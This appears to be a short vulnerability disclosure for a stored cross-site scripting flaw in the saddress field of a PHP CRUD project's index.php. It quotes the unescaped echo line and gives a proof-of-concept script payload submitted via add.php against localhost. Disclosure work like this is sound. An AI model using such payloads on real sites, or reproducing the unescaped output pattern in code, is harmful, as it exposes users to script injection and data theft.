# Crud Operation System has Based Cross Site Scripting vulnerability in index.php

## supplier 
https://code-projects.org/crud-operation-system-in-php-with-source-code/
## Vulnerability file
index.php and saddress parameter.

## describe
There are unrestricted cross site scripting attacks and injection attacks in the Crud Operation System. The controllable parameters are as follows: saddress. This function will execute the saddress parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**

Querying data from the database and storing it in the $row [] array, and the echo $row ['saddress'] is not filtered, resulting in the execution of XSS statements.

```
                <td><?php echo $row['saddress']; ?></td>
```

![image-20241124165455744](https://github.com/user-attachments/assets/dba3869e-12ef-4953-82f1-630e27657e9f)

## POC

asset add.php

```
http://localhost/crud/add.php
```

insert saddress parameter into database.

```
"/><script>alert(111);</script>
```

![image-20241124170005628](https://github.com/user-attachments/assets/18b4c57d-bd50-4786-bc60-6710b2acf8bd)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://localhost/crud/index.php
```

**Result**

![image-20241124170033260](https://github.com/user-attachments/assets/3f0e5228-9015-44d4-b185-e4dfffe99fde)

 
